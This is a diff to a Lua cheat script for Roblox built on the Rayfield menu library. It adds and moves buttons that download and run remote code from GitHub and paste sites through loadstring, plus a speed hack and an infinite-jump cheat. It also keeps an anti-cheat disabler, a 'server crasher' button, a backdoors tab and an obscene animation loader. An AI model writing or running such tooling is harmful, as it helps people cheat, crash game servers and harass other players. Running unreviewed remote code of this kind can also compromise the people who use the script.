@@ -1,5 +1,3 @@
-
-
 loadstring(game:HttpGet('https://raw.githubusercontent.com/jalilwas/Sirius-Plugins/refs/heads/main/Rayfield%20Logo%20Remover'))()
     
     local function DisableAntiCheat()
@@ -19,7 +17,7 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/jalilwas/Sirius-Plugi
     local LocalPlayer = Players.LocalPlayer
     
     -- Replace with the username you want to kick
-    local blockedUser = "BlacklistPlaceholder"
+    local blockedUser = "MrBeast"
     
     if LocalPlayer.Name == blockedUser then
         LocalPlayer:Kick("Access denied.")
@@ -57,54 +55,21 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/jalilwas/Sirius-Plugi
        }
     })
     
-    local Tab = Window:CreateTab("🎨 | THENE", nil)
+local Tab = Window:CreateTab("🎨 | THEME", nil)
         
+Tab:CreateLabel("wip.", nil, Color3.fromRGB(255, 255, 255), false)
+
+local Tab = Window:CreateTab("🔢 | ALTERNATIVE", nil)
+
     Tab:CreateButton({
-    Name = "Default Theme",
-    Callback = ChangeTheme("Default")
-})
+        Name = "ALT",
+        Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bilsurrr/hi.lol/refs/heads/main/backup%20shit%20ignore.lua"))()
+        end
+    })
 
-Tab:CreateButton({
-    Name = "Amber Glow Theme",
-    Callback = ChangeTheme("AmberGlow")
-})
 
-Tab:CreateButton({
-    Name = "Amethyst (Purple) Theme",
-    Callback = ChangeTheme("Amethyst")
-})
-
-Tab:CreateButton({
-    Name = "Bloom Theme",
-    Callback = ChangeTheme("Bloom")
-})
-
-Tab:CreateButton({
-    Name = "Dark Blue Theme",
-    Callback = ChangeTheme("DarkBlue")
-})
-
-Tab:CreateButton({
-    Name = "Green Theme",
-    Callback = ChangeTheme("Green")
-})
-
-Tab:CreateButton({
-    Name = "Light Theme",
-    Callback = ChangeTheme("Light")
-})
-
-Tab:CreateButton({
-    Name = "Ocean Theme",
-    Callback = ChangeTheme("Ocean")
-})
-
-Tab:CreateButton({
-    Name = "Serenity Theme",
-    Callback = ChangeTheme("Serenity")
-})  
-
-    local Tab = Window:CreateTab("👑 | NEW COOL STUFF", nil)
+local Tab = Window:CreateTab("👑 | NEW COOL STUFF", nil)
 
     Tab:CreateInput({
         Name = "Execute Code",
@@ -271,9 +236,42 @@ Tab:CreateButton({
         ["Ronix"] = true,
         ["Xeno"] = true,
         ["Swift"] = true,
-        ["Arceus X"] = false,
-        ["Electron"] = false
+        ["Arceus X"] = false
     }
+    
+    local WalkSpeed = 16
+    local InfiniteJump = false
+    
+    Tab:CreateSlider({
+       Name = "WalkSpeed",
+       Range = {16, 250},
+       Increment = 1,
+       Suffix = "speed",
+       CurrentValue = WalkSpeed,
+       Flag = "WalkSpeed",
+       Callback = function(val)
+           WalkSpeed = val
+           pcall(function()
+               game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = WalkSpeed
+           end)
+       end
+    })
+    
+    Tab:CreateToggle({
+       Name = "Infinite Jump",
+       CurrentValue = false,
+       Flag = "InfiniteJump",
+       Callback = function(value)
+           InfiniteJump = value
+       end
+    })
+    
+    Tab:CreateButton({
+       Name = "JERK OFF R15",
+       Callback = function()
+           loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
+       end,
+    })
     
     if trustedExecutors[executorName] == true then
         safetyLevel = "✅ Safe"
@@ -305,7 +303,6 @@ Tab:CreateButton({
     
     Tab:CreateSection(".")
     Tab:CreateLabel("im sorry.", nil, Color3.fromRGB(255, 255, 255), false)
-    Tab:CreateLabel("...", nil, Color3.fromRGB(255, 255, 255), false)
 
     Tab:CreateSection("YOUR INFO")
     
@@ -648,7 +645,7 @@ Tab:CreateButton({
     Tab:CreateButton({
        Name = "WISL OLD",
        Callback = function()
-          loadstring(game:HttpGet("https://raw.githubusercontent.com/Bilsurrr/bilsr-hub-rayfield/refs/heads/main/skiubiditoi%20wertlsdfsdgsd", true))()
+          loadstring(game:HttpGet("https://raw.githubusercontent.com/Bilsurrr/bilsr-hub-rayfield/0c5f3f8ac68b668473e1e64b9e269b62626bb34a/skiubiditoi%20wertlsdfsdgsd", true))()
        end,
     })
     
@@ -954,7 +951,16 @@ Tab:CreateButton({
           end) 
        end,
     })
-    
+
+    Tab:CreateButton({
+       Name = "SIMPLESPY",
+       Callback = function()
+          pcall(function()
+             loadstring(game:HttpGet("https://raw.githubusercontent.com/BOXLEGENDARY/SimpleSpyZxL/refs/heads/main/notify.lua"))()        
+          end) 
+       end,
+    })
+
     Tab:CreateButton({
        Name = "server crasher (only works if game has hd admin)",
        Callback = function()
@@ -997,50 +1003,10 @@ Tab:CreateButton({
             local target = game.Players:FindFirstChild(teleportName)
             if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                 pcall(function()
-                    plr.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
+                    plr.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                 end)
-            else
-                Rayfield:Notify({
-                    Title = "Error",
-                    Content = "Player not found or no character!",
-                    Duration = 3,
-                })
             end
         end,
-    })
-    
-    local WalkSpeed = 16
-    local InfiniteJump = false
-    
-    Tab:CreateSlider({
-       Name = "WalkSpeed",
-       Range = {16, 250},
-       Increment = 1,
-       Suffix = "speed",
-       CurrentValue = WalkSpeed,
-       Flag = "WalkSpeed",
-       Callback = function(val)
-           WalkSpeed = val
-           pcall(function()
-               game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = WalkSpeed
-           end)
-       end
-    })
-    
-    Tab:CreateToggle({
-       Name = "Infinite Jump",
-       CurrentValue = false,
-       Flag = "InfiniteJump",
-       Callback = function(value)
-           InfiniteJump = value
-       end
-    })
-    
-    Tab:CreateButton({
-       Name = "JERK OFF R15",
-       Callback = function()
-           loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
-       end,
     })
     
     game:GetService("UserInputService").JumpRequest:Connect(function()
@@ -1091,7 +1057,7 @@ Tab:CreateButton({
        end,
     })
     
-    local Tab = Window:CreateTab("🤘| require & backdoors", nil) -- Title, Image
+    local Tab = Window:CreateTab("🤘| BACKDOORS", nil) -- Title, Image
     local Button = Tab:CreateButton({
        Name = "lalol backdoor",
        Callback = function()
@@ -1129,7 +1095,6 @@ Tab:CreateButton({
     })
     
     
-
 
 
 
